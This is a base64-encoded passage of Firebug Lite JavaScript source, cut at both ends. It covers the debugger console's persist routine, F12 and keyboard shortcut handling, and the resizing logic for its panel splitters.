CiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKEVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlbW92ZUV2ZW50KEZpcmVidWcuYnJvd3Nlci53aW5kb3csICJ1bmxvYWQiLCB0aGlzLnBlcnNpc3QpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBDaHJvbWVCYXNlLmRlc3Ryb3kuYXBwbHkodGhpcyk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnQ2hyb21lLmNocm9tZU1hcC5wb3B1cCA9IG51bGw7DQogICAgICAgIA0KICAgICAgICB0aGlzLm5vZGUuY2xvc2UoKTsNCiAgICB9LA0KICAgIA0KICAgIHBlcnNpc3Q6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHBlcnNpc3RUaW1lU3RhcnQgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsNCiAgICAgICAgDQogICAgICAgIHJlbW92ZUV2ZW50KEZpcmVidWcuYnJvd3Nlci53aW5kb3csICJ1bmxvYWQiLCB0aGlzLnBlcnNpc3QpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3IuZGVzdHJveSgpOw0KICAgICAgICBGaXJlYnVnLmJyb3dzZXIud2luZG93LkZpcmVidWdPbGRCcm93c2VyID0gdHJ1ZTsNCiAgICAgICAgDQogICAgICAgIHZhciBwZXJzaXN0VGltZVN0YXJ0ID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgIA0KICAgICAgICB2YXIgd2FpdE1haW5XaW5kb3cgPSBmdW5jdGlvbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBkb2MsIGhlYWQ7DQogICAgICAgIA0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5vcGVuZXIgJiYgIXdpbmRvdy5vcGVuZXIuRmlyZWJ1Z09sZEJyb3dzZXIgJiYgKGRvYyA9IHdpbmRvdy5vcGVuZXIuZG9jdW1lbnQpLyogJiYgDQogICAgICAgICAgICAgICAgICAgIGRvYy5kb2N1bWVudEVsZW1lbnQgJiYgKGhlYWQgPSBkb2MuZG9jdW1lbnRFbGVtZW50LmZpcnN0Q2hpbGQpKi8pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGV4cG9zZXMgdGhlIEZCTCB0byB0aGUgZ2xvYmFsIG5hbWVzcGFjZSB3aGVuIGluIGRlYnVnIG1vZGUNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChFbnYuaXNEZWJ1Z01vZGUpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LkZCTCA9IEZCTDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LkZpcmVidWcgPSBGaXJlYnVnOw0KICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93Lm9wZW5lci5GaXJlYnVnID0gRmlyZWJ1ZzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIEVudi5icm93c2VyID0gd2luZG93Lm9wZW5lcjsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVidWcuYnJvd3NlciA9IEZpcmVidWcuY29udGV4dCA9IG5ldyBDb250ZXh0KEVudi5icm93c2VyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVidWcubG9hZFByZWZzKCk7ICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICByZWdpc3RlckNvbnNvbGUoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIHRoZSBkZWxheSB0aW1lIHNob3VsZCBiZSBjYWxjdWxhdGVkIHJpZ2h0IGFmdGVyIHJlZ2lzdGVyaW5nIHRoZSANCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUsIG9uY2UgcmlnaHQgYWZ0ZXIgdGhlIGNvbnNvbGUgcmVnaXN0cmF0aW9uLCBjYWxsIGxvZyBtZXNzYWdlcw0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gd2lsbCBiZSBwcm9wZXJseSBoYW5kbGVkDQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGVyc2lzdERlbGF5ID0gbmV3IERhdGUoKS5nZXRUaW1lKCkgLSBwZXJzaXN0VGltZVN0YXJ0Ow0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNocm9tZSA9IEZpcmVidWcuY2hyb21lOw0KICAgICAgICAgICAgICAgICAgICAgICAgYWRkRXZlbnQoRmlyZWJ1Zy5icm93c2VyLndpbmRvdywgInVubG9hZCIsIGNocm9tZS5wZXJzaXN0KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIEZCTC5jYWNoZURvY3VtZW50KCk7DQogICAgICAgICAgICAgICAgICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5jcmVhdGUoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2dGb3JtYXR0ZWQoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgWyJGaXJlYnVnIGNvdWxkIG5vdCBjYXB0dXJlIGNvbnNvbGUgY2FsbHMgZHVyaW5nICIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBlcnNpc3REZWxheSArICJtcyJdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpcmVidWcuY29udGV4dCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaW5mbyINCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgaHRtbFBhbmVsID0gY2hyb21lLmdldFBhbmVsKCJIVE1MIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHRtbFBhbmVsLmNyZWF0ZVVJKCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9LDUwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhdGNoKHBFKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBhbGVydCgicGVyc2lzdCBlcnJvcjogIiArIChwRS5tZXNzYWdlIHx8IHBFKSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXRUaW1lb3V0KHdhaXRNYWluV2luZG93LCAwKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIH0gY2F0Y2ggKEUpIHsNCiAgICAgICAgICAgICAgICB3aW5kb3cuY2xvc2UoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHdhaXRNYWluV2luZG93KCk7ICAgIA0KICAgIH0sDQogICAgDQogICAgY2xvc2U6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuZGVzdHJveSgpOw0KICAgIH0NCg0KfSk7DQoNCg0KLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFVJIGhlbHBlcnMNCg0KdmFyIGNoYW5nZUNvbW1hbmRMaW5lVmlzaWJpbGl0eSA9IGZ1bmN0aW9uIGNoYW5nZUNvbW1hbmRMaW5lVmlzaWJpbGl0eSh2aXNpYmlsaXR5KQ0Kew0KICAgIHZhciBsYXN0ID0gRmlyZWJ1Zy5jaHJvbWUuY29tbWFuZExpbmVWaXNpYmxlOw0KICAgIHZhciB2aXNpYmxlID0gRmlyZWJ1Zy5jaHJvbWUuY29tbWFuZExpbmVWaXNpYmxlID0gIA0KICAgICAgICB0eXBlb2YgdmlzaWJpbGl0eSA9PSAiYm9vbGVhbiIgPyB2aXNpYmlsaXR5IDogIUZpcmVidWcuY2hyb21lLmNvbW1hbmRMaW5lVmlzaWJsZTsNCiAgICANCiAgICBpZiAodmlzaWJsZSAhPSBsYXN0KQ0KICAgIHsNCiAgICAgICAgaWYgKHZpc2libGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZiQm90dG9tLmNsYXNzTmFtZSA9ICIiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoRmlyZWJ1Zy5Db21tYW5kTGluZSkNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLmFjdGl2YXRlKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRmlyZWJ1Zy5Db21tYW5kTGluZSkNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLmRlYWN0aXZhdGUoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJCb3R0b20uY2xhc3NOYW1lID0gImhpZGUiOw0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KdmFyIGNoYW5nZVNpZGVQYW5lbFZpc2liaWxpdHkgPSBmdW5jdGlvbiBjaGFuZ2VTaWRlUGFuZWxWaXNpYmlsaXR5KHZpc2liaWxpdHkpDQp7DQogICAgdmFyIGxhc3QgPSBGaXJlYnVnLmNocm9tZS5zaWRlUGFuZWxWaXNpYmxlOw0KICAgIEZpcmVidWcuY2hyb21lLnNpZGVQYW5lbFZpc2libGUgPSAgDQogICAgICAgIHR5cGVvZiB2aXNpYmlsaXR5ID09ICJib29sZWFuIiA/IHZpc2liaWxpdHkgOiAhRmlyZWJ1Zy5jaHJvbWUuc2lkZVBhbmVsVmlzaWJsZTsNCiAgICANCiAgICBpZiAoRmlyZWJ1Zy5jaHJvbWUuc2lkZVBhbmVsVmlzaWJsZSAhPSBsYXN0KQ0KICAgIHsNCiAgICAgICAgZmJQYW5lbEJveDIuY2xhc3NOYW1lID0gRmlyZWJ1Zy5jaHJvbWUuc2lkZVBhbmVsVmlzaWJsZSA/ICIiIDogImhpZGUiOyANCiAgICAgICAgZmJQYW5lbEJhcjJCb3guY2xhc3NOYW1lID0gRmlyZWJ1Zy5jaHJvbWUuc2lkZVBhbmVsVmlzaWJsZSA/ICIiIDogImhpZGUiOw0KICAgIH0NCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBGMTIgSGFuZGxlcg0KDQp2YXIgb25HbG9iYWxLZXlEb3duID0gZnVuY3Rpb24gb25HbG9iYWxLZXlEb3duKGV2ZW50KQ0Kew0KICAgIHZhciBrZXlDb2RlID0gZXZlbnQua2V5Q29kZTsNCiAgICB2YXIgc2hpZnRLZXkgPSBldmVudC5zaGlmdEtleTsNCiAgICB2YXIgY3RybEtleSA9IGV2ZW50LmN0cmxLZXk7DQogICAgDQogICAgaWYgKGtleUNvZGUgPT0gMTIzIC8qIEYxMiAqLyAmJiAoIWlzRmlyZWZveCAmJiAhc2hpZnRLZXkgfHwgc2hpZnRLZXkgJiYgaXNGaXJlZm94KSkNCiAgICB7DQogICAgICAgIEZpcmVidWcuY2hyb21lLnRvZ2dsZShmYWxzZSwgY3RybEtleSk7DQogICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50LCB0cnVlKTsNCg0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyByZXBsYWNlIHdpdGggYSBiZXR0ZXIgc29sdXRpb24uIHdlJ3JlIGRvaW5nIHRoaXMNCiAgICAgICAgLy8gdG8gYWxsb3cgcmVhY3RpdmF0aW5nIHdpdGggdGhlIEYxMiBrZXkgYWZ0ZXIgYmVpbmcgZGVhY3RpdmF0ZWQNCiAgICAgICAgaWYgKEVudi5pc0Nocm9tZUV4dGVuc2lvbikNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Zy5Hb29nbGVDaHJvbWUuZGlzcGF0Y2goIkZCX2VuYWJsZUljb24iKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIGlmIChrZXlDb2RlID09IDY3IC8qIEMgKi8gJiYgY3RybEtleSAmJiBzaGlmdEtleSkNCiAgICB7DQogICAgICAgIEZpcmVidWcuSW5zcGVjdG9yLnRvZ2dsZUluc3BlY3QoKTsNCiAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgIH0NCiAgICBlbHNlIGlmIChrZXlDb2RlID09IDc2IC8qIEwgKi8gJiYgY3RybEtleSAmJiBzaGlmdEtleSkNCiAgICB7DQogICAgICAgIEZpcmVidWcuY2hyb21lLmZvY3VzQ29tbWFuZExpbmUoKTsNCiAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgIH0NCn07DQoNCnZhciBvbk1pbmlJY29uQ2xpY2sgPSBmdW5jdGlvbiBvbk1pbmlJY29uQ2xpY2soZXZlbnQpDQp7DQogICAgRmlyZWJ1Zy5jaHJvbWUudG9nZ2xlKGZhbHNlLCBldmVudC5jdHJsS2V5KTsNCiAgICBjYW5jZWxFdmVudChldmVudCwgdHJ1ZSk7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gSG9yaXpvbnRhbCBTcGxpdHRlciBIYW5kbGluZw0KDQp2YXIgb25IU3BsaXR0ZXJNb3VzZURvd24gPSBmdW5jdGlvbiBvbkhTcGxpdHRlck1vdXNlRG93bihldmVudCkNCnsNCiAgICBhZGRHbG9iYWxFdmVudCgibW91c2Vtb3ZlIiwgb25IU3BsaXR0ZXJNb3VzZU1vdmUpOw0KICAgIGFkZEdsb2JhbEV2ZW50KCJtb3VzZXVwIiwgb25IU3BsaXR0ZXJNb3VzZVVwKTsNCiAgICANCiAgICBpZiAoaXNJRSkNCiAgICAgICAgYWRkRXZlbnQoRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgIm1vdXNlbGVhdmUiLCBvbkhTcGxpdHRlck1vdXNlVXApOw0KICAgIA0KICAgIGZiSFNwbGl0dGVyLmNsYXNzTmFtZSA9ICJmYk9uTW92aW5nSFNwbGl0dGVyIjsNCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9Ow0KDQp2YXIgb25IU3BsaXR0ZXJNb3VzZU1vdmUgPSBmdW5jdGlvbiBvbkhTcGxpdHRlck1vdXNlTW92ZShldmVudCkNCnsNCiAgICBjYW5jZWxFdmVudChldmVudCwgdHJ1ZSk7DQogICAgDQogICAgdmFyIGNsaWVudFkgPSBldmVudC5jbGllbnRZOw0KICAgIHZhciB3aW4gPSBpc0lFDQogICAgICAgID8gZXZlbnQuc3JjRWxlbWVudC5vd25lckRvY3VtZW50LnBhcmVudFdpbmRvdw0KICAgICAgICA6IGV2ZW50LnRhcmdldC5kZWZhdWx0VmlldyB8fCBldmVudC50YXJnZXQub3duZXJEb2N1bWVudCAmJiBldmVudC50YXJnZXQub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICANCiAgICBpZiAoIXdpbikNCiAgICAgICAgcmV0dXJuOw0KICAgIA0KICAgIGlmICh3aW4gIT0gd2luLnBhcmVudCkNCiAgICB7DQogICAgICAgIHZhciBmcmFtZUVsZW1lbnQgPSB3aW4uZnJhbWVFbGVtZW50Ow0KICAgICAgICBpZiAoZnJhbWVFbGVtZW50KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgZnJhbWVQb3MgPSBGaXJlYnVnLmJyb3dzZXIuZ2V0RWxlbWVudFBvc2l0aW9uKGZyYW1lRWxlbWVudCkudG9wOw0KICAgICAgICAgICAgY2xpZW50WSArPSBmcmFtZVBvczsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGZyYW1lRWxlbWVudC5zdHlsZS5wb3NpdGlvbiAhPSAiZml4ZWQiKQ0KICAgICAgICAgICAgICAgIGNsaWVudFkgLT0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1Njcm9sbFBvc2l0aW9uKCkudG9wOw0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgIGlmIChpc09wZXJhICYmIGlzUXVpa3NNb2RlICYmIHdpbi5mcmFtZUVsZW1lbnQuaWQgPT0gIkZpcmVidWdVSSIpDQogICAgew0KICAgICAgICBjbGllbnRZID0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1NpemUoKS5oZWlnaHQgLSB3aW4uZnJhbWVFbGVtZW50Lm9mZnNldEhlaWdodCArIGNsaWVudFk7DQogICAgfQ0KICAgIA0KICAgIC8qDQogICAgY29uc29sZS5sb2coDQogICAgICAgICAgICB0eXBlb2Ygd2luLkZCTCAhPSAidW5kZWZpbmVkIiA/ICJuby1DaHJvbWUiIDogIkNocm9tZSIsDQogICAgICAgICAgICAvL3dpbi5mcmFtZUVsZW1lbnQuaWQsDQogICAgICAgICAgICBldmVudC50YXJnZXQsDQogICAgICAgICAgICBjbGllbnRZDQogICAgICAgICk7LyoqLw0KICAgIA0KICAgIG9uSFNwbGl0dGVyTW91c2VNb3ZlQnVmZmVyID0gY2xpZW50WTsgLy8gYnVmZmVyDQogICAgDQogICAgaWYgKG5ldyBEYXRlKCkuZ2V0VGltZSgpIC0gbGFzdEhTcGxpdHRlck1vdXNlTW92ZSA+IGNocm9tZVJlZHJhd1NraXBSYXRlKSAvLyBmcmFtZSBza2lwcGluZw0KICAgIHsNCiAgICAgICAgbGFzdEhTcGxpdHRlck1vdXNlTW92ZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KICAgICAgICBoYW5kbGVIU3BsaXR0ZXJNb3VzZU1vdmUoKTsNCiAgICB9DQogICAgZWxzZQ0KICAgICAgICBpZiAoIW9uSFNwbGl0dGVyTW91c2VNb3ZlVGltZXIpDQogICAgICAgICAgICBvbkhTcGxpdHRlck1vdXNlTW92ZVRpbWVyID0gc2V0VGltZW91dChoYW5kbGVIU3BsaXR0ZXJNb3VzZU1vdmUsIGNocm9tZVJlZHJhd1NraXBSYXRlKTsNCiAgICANCiAgICAvLyBpbXByb3ZpbmcgdGhlIHJlc2l6aW5nIHBlcmZvcm1hbmNlIGJ5IGNhbmNlbGluZyB0aGUgbW91c2UgZXZlbnQuDQogICAgLy8gY2FuY2VsaW5nIGV2ZW50cyB3aWxsIHByZXZlbnQgdGhlIHBhZ2UgdG8gcmVjZWl2ZSBzdWNoIGV2ZW50cywgd2hpY2ggd291bGQgaW1wbHkNCiAgICAvLyBpbiBtb3JlIHByb2Nlc3NpbmcgYmVpbmcgZXhwZW5kZWQuDQogICAgY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgIHJldHVybiBmYWxzZTsNCn07DQoNCnZhciBoYW5kbGVIU3BsaXR0ZXJNb3VzZU1vdmUgPSBmdW5jdGlvbigpDQp7DQogICAgaWYgKG9uSFNwbGl0dGVyTW91c2VNb3ZlVGltZXIpDQogICAgew0KICAgICAgICBjbGVhclRpbWVvdXQob25IU3BsaXR0ZXJNb3VzZU1vdmVUaW1lcik7DQogICAgICAgIG9uSFNwbGl0dGVyTW91c2VNb3ZlVGltZXIgPSBudWxsOw0KICAgIH0NCiAgICANCiAgICB2YXIgY2xpZW50WSA9IG9uSFNwbGl0dGVyTW91c2VNb3ZlQnVmZmVyOw0KICAgIA0KICAgIHZhciB3aW5kb3dTaXplID0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1NpemUoKTsNCiAgICB2YXIgc2Nyb2xsU2l6ZSA9IEZpcmVidWcuYnJvd3Nlci5nZXRXaW5kb3dTY3JvbGxTaXplKCk7DQogICAgDQogICAgLy8gY29tcHV0ZSBjaHJvbWUgZml4ZWQgc2l6ZSAodG9wIGJhciBhbmQgY29tbWFuZCBsaW5lKQ0KICAgIHZhciBjb21tYW5kTGluZUhlaWdodCA9IEZpcmVidWcuY2hyb21lLmNvbW1hbmRMaW5lVmlzaWJsZSA/IGZiQ29tbWFuZExpbmUub2Zmc2V0SGVpZ2h0IDogMDsNCiAgICB2YXIgZml4ZWRIZWlnaHQgPSB0b3BIZWlnaHQgKyBjb21tYW5kTGluZUhlaWdodDsNCiAgICB2YXIgY2hyb21lTm9kZSA9IEZpcmVidWcuY2hyb21lLm5vZGU7DQogICAgDQogICAgdmFyIHNjcm9sbGJhclNpemUgPSAhaXNJRSAmJiAoc2Nyb2xsU2l6ZS53aWR0aCA+IHdpbmRvd1NpemUud2lkdGgpID8gMTcgOiAwOw0KICAgIA0KICAgIC8vdmFyIGhlaWdodCA9ICFpc09wZXJhID8gY2hyb21lTm9kZS5vZmZzZXRUb3AgKyBjaHJvbWVOb2RlLmNsaWVudEhlaWdodCA6IHdpbmRvd1NpemUuaGVpZ2h0Ow0KICAgIHZhciBoZWlnaHQgPSAgd2luZG93U2l6ZS5oZWlnaHQ7DQogICAgDQogICAgLy8gY29tcHV0ZSB0aGUgbWluIGFuZCBtYXggc2l6ZSBvZiB0aGUgY2hyb21lDQogICAgdmFyIGNocm9tZUhlaWdodCA9IE1hdGgubWF4KGhlaWdodCAtIGNsaWVudFkgKyA1IC0gc2Nyb2xsYmFyU2l6ZSwgZml4ZWRIZWlnaHQpOw0KICAgICAgICBjaHJvbWVIZWlnaHQgPSBNYXRoLm1pbihjaHJvbWVIZWlnaHQsIHdpbmRvd1NpemUuaGVpZ2h0IC0gc2Nyb2xsYmFyU2l6ZSk7DQoNCiAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuaGVpZ2h0ID0gY2hyb21lSGVpZ2h0Ow0KICAgIGNocm9tZU5vZGUuc3R5bGUuaGVpZ2h0ID0gY2hyb21lSGVpZ2h0ICsgInB4IjsNCiAgICANCiAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICBGaXJlYnVnLmNocm9tZS5maXhJRVBvc2l0aW9uKCk7DQogICAgDQogICAgRmlyZWJ1Zy5jaHJvbWUuZHJhdygpOw0KfTsNCg0KdmFyIG9uSFNwbGl0dGVyTW91c2VVcCA9IGZ1bmN0aW9uIG9uSFNwbGl0dGVyTW91c2VVcChldmVudCkNCnsNCiAgICByZW1vdmVHbG9iYWxFdmVudCgibW91c2Vtb3ZlIiwgb25IU3BsaXR0ZXJNb3VzZU1vdmUpOw0KICAgIHJlbW92ZUdsb2JhbEV2ZW50KCJtb3VzZXVwIiwgb25IU3BsaXR0ZXJNb3VzZVVwKTsNCiAgICANCiAgICBpZiAoaXNJRSkNCiAgICAgICAgcmVtb3ZlRXZlbnQoRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgIm1vdXNlbGVhdmUiLCBvbkhTcGxpdHRlck1vdXNlVXApOw0KICAgIA0KICAgIGZiSFNwbGl0dGVyLmNsYXNzTmFtZSA9ICIiOw0KICAgIA0KICAgIEZpcmVidWcuY2hyb21lLmRyYXcoKTsNCiAgICANCiAgICAvLyBhdm9pZCB0ZXh0IHNlbGVjdGlvbiBpbiBJRSB3aGVuIHJldHVybmluZyB0byB0aGUgZG9jdW1lbnQNCiAgICAvLyBhZnRlciB0aGUgbW91c2UgbGVhdmVzIHRoZSBkb2N1bWVudCBkdXJpbmcgdGhlIHJlc2l6aW5nDQogICAgcmV0dXJuIGZhbHNlOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFZlcnRpY2FsIFNwbGl0dGVyIEhhbmRsaW5nDQoNCnZhciBvblZTcGxpdHRlck1vdXNlRG93biA9IGZ1bmN0aW9uIG9uVlNwbGl0dGVyTW91c2VEb3duKGV2ZW50KQ0Kew0KICAgIGFkZEdsb2JhbEV2ZW50KCJtb3VzZW1vdmUiLCBvblZTcGxpdHRlck1vdXNlTW92ZSk7DQogICAgYWRkR2xvYmFsRXZlbnQoIm1vdXNldXAiLCBvblZTcGxpdHRlck1vdXNlVXApOw0KICAgIA0KICAgIHJldHVybiBmYWxzZTsNCn07DQoNCnZhciBvblZTcGxpdHRlck1vdXNlTW92ZSA9IGZ1bmN0aW9uIG9uVlNwbGl0dGVyTW91c2VNb3ZlKGV2ZW50KQ0Kew0KICAgIGlmIChuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIGxhc3RWU3BsaXR0ZXJNb3VzZU1vdmUgPiBjaHJvbWVSZWRyYXdTa2lwUmF0ZSkgLy8gZnJhbWUgc2tpcHBpbmcNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgaWYgKHRhcmdldCAmJiB0YXJnZXQub3duZXJEb2N1bWVudCkgLy8gYXZvaWQgZXJyb3Igd2hlbiBjdXJzb3IgcmVhY2hlcyBvdXQgb2YgdGhlIGNocm9tZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY2xpZW50WCA9IGV2ZW50LmNsaWVudFg7DQogICAgICAgICAgICB2YXIgd2luID0gZG9jdW1lbnQuYWxsDQogICAgICAgICAgICAgICAgPyBldmVudC5zcmNFbGVtZW50Lm93bmVyRG9jdW1lbnQucGFyZW50V2luZG93DQogICAgICAgICAgICAgICAgOiBldmVudC50YXJnZXQub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICAgICAgICANCiAgICAgICAgICAgIGlmICh3aW4gIT0gd2luLnBhcmVudCkNCiAgICAgICAgICAgICAgICBjbGllbnRYICs9IHdpbi5mcmFtZUVsZW1lbnQgPyB3aW4uZnJhbWVFbGVtZW50Lm9mZnNldExlZnQgOiAwOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgc2l6ZSA9IEZpcmVidWcuY2hyb21lLmdldFNpemUoKTsNCiAgICAgICAgICAgIHZhciB4ID0gTWF0aC5tYXgoc2l6ZS53aWR0aCAtIGNsaWVudFggKyAzLCA2KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLnNpZGVQYW5lbFdpZHRoID0geDsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmRyYXcoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgbGFzdFZTcGxpdHRlck1vdXNlTW92ZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KICAgIH0NCiAgICANCiAgICBjYW5jZWxFdmVudChldmVudCwgdHJ1ZSk7DQogICAgcmV0dXJuIGZhbHNlOw0KfTsNCg0KdmFyIG9uVlNwbGl0dGVyTW91c2VVcCA9IGZ1bmN0aW9uIG9uVlNwbGl0dGVyTW91c2VVcChldmVudCkNCnsNCiAgICByZW1vdmVHbG9iYWxFdmVudCgibW91c2Vtb3ZlIiwgb25WU3BsaXR0ZXJNb3VzZU1vdmUpOw0KICAgIHJlbW92ZUdsb2JhbEV2ZW50KCJtb3VzZXVwIiwgb25WU3BsaXR0ZXJNb3VzZVVwKTsNCiAgICANCiAgICBGaXJlYnVnLmNocm9tZS5kcmF3KCk7DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5MaXRlID0NCnsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpGaXJlYnVnLk